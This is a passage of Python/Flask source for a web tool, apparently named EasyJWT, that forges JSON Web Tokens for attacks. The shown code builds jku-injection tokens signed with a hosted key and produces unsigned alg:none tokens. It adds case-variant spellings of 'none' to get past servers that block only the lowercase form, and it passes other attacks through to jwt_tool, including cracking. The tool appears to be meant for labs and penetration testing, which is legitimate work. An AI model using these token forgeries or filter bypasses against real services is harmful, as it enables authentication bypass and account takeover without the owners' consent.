            else "kid left exactly as it was in the header (Manual was selected), which means "
                 "no kid at all if the original token didn't have one."
        )

        if jwks_url:
            note = (
                f"Signed with EasyJWT's built-in default key, jku set to the URL you gave: {target_jku}, "
                f"{kid_note}\n"
                f"Make sure that URL actually serves a JWKS containing this exact key under that kid "
                f"(visit {default_jwks_url} yourself and copy its \"keys\" entry into your JWKS body, "
                "or pick it from the kid dropdown above, which fetches from that URL automatically) "
                "or the target won't find a matching key to verify this signature."
            )
        else:
            note = (
                "No JWKS URL given, so jku points at EasyJWT's own hosted default key "
                f"({default_jwks_url}). If the target server can't reach that domain, paste "
                "your own URL above instead (e.g. a lab's exploit server) and host the same "
                f"key there yourself, copied from {default_jwks_url}. {kid_note}"
            )

        output = f"{note}\n\nNew JWT:\n\n{new_token}"
        return jsonify({"output": output})
    elif code == "a":
        # alg:none, built natively (not delegated to jwt_tool) so we can
        # return several differently-cased spellings at once. Some servers
        # block the exact lowercase string "none" but still accept a
        # case-mangled version of it, since the JWT spec never says the
        # comparison has to be case-sensitive and not every implementation
        # bothers to lowercase first.
        parts = token.split(".")
        if len(parts) < 2:
            return jsonify({"error": "That does not look like a JWT"}), 400
        try:
            header = json.loads(b64url_decode(parts[0]))
            payload = json.loads(b64url_decode(parts[1]))
        except Exception as exc:
            return jsonify({"error": f"Could not decode token: {exc}"}), 400
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return jsonify({"error": "Token header/payload must be JSON objects"}), 400

        # Case variants are off by default (the "Include case variants"
        # checkbox in the UI) so the common case, one plain "none" token,
        # doesn't make you scroll past 4 extra boxes you probably don't
        # need. Generating them costs nothing either way (it's just string
        # formatting), this is purely about not cluttering the result.
        include_variants = bool(data.get("none_variants"))
        variants = ["none", "None", "NONE", "nOnE", "noNe"] if include_variants else ["none"]
        payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        tokens = []
        for variant in variants:
            variant_header = dict(header)
            variant_header["alg"] = variant
            header_b64 = b64url_encode(json.dumps(variant_header, separators=(",", ":")).encode())
            tokens.append({"label": variant, "token": f"{header_b64}.{payload_b64}."})

        if include_variants:
            note = (
                "Re-signed with alg set to \"none\", plus 4 differently-cased spellings "
                "of it, with the signature removed entirely. Some servers only block the "
                "exact lowercase string and accept one of the others. For a custom "
                "combination of your own, use Forge instead."
            )
        else:
            note = (
                "Re-signed with alg set to \"none\" and the signature removed "
                "entirely. If the server blocks that exact string, tick "
                "\"Include case variants\" and try again, some servers only "
                "check for the lowercase spelling."
            )

        output = note + "\n\n" + "\n\n".join(f"{t['label']}:\n{t['token']}" for t in tokens)
        return jsonify({"output": output, "tokens": tokens})

    try:
        output = run_jwt_tool(args)
    except subprocess.TimeoutExpired:
        output = "Request timed out"
    finally:
        if tmp_key_path and os.path.exists(tmp_key_path):
            os.remove(tmp_key_path)

    return jsonify({"output": output})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    # threaded=True: without it this dev server handles one request at a
    # time, full stop. A single slow request (a crack run, a key recovery)
    # then freezes the ENTIRE app for everyone, including you in another
    # tab, which looks exactly like the service going down even though
    # nothing crashed. The only shared mutable state across requests is the
    # rate limiter's plain dict (_last_request), and a race there just
    # means a rate-limit check is occasionally off by a request, not a
    # correctness or safety issue.
    app.run(host="0.0.0.0", port=port, threaded=True)
